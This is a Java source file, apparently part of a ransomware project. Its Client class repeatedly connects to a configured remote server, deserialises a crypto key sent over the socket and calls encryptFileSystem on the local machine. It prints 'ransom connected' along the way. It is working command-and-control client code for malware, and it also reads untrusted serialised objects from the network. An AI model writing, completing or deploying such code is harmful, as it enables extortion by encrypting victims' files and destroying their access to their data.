package Agent.networking;

import java.io.IOException;
import java.io.ObjectInputStream;

import java.net.Socket;
import org.springframework.beans.factory.annotation.Value;

import Agent.Attack.AttackVector;
import Agent.entites.CryptoKey;

public class Client {
	@Value("${server.port}")
	private int port;
	@Value("${server.host}")
	private String host;

	
	public void start() throws Exception {
		try {
			while (true) {
				Socket clientSocket = new Socket(host, port);
				ObjectInputStream is = new ObjectInputStream(clientSocket.getInputStream());
				System.out.println("ransom connected + got input stream");
				CryptoKey key = (CryptoKey) is.readObject();
				AttackVector attack = new AttackVector();
				attack.encryptFileSystem(key);
				clientSocket.close();
			}
		} catch (ClassNotFoundException | IOException e) {
			throw new Exception();
		}
	}
}
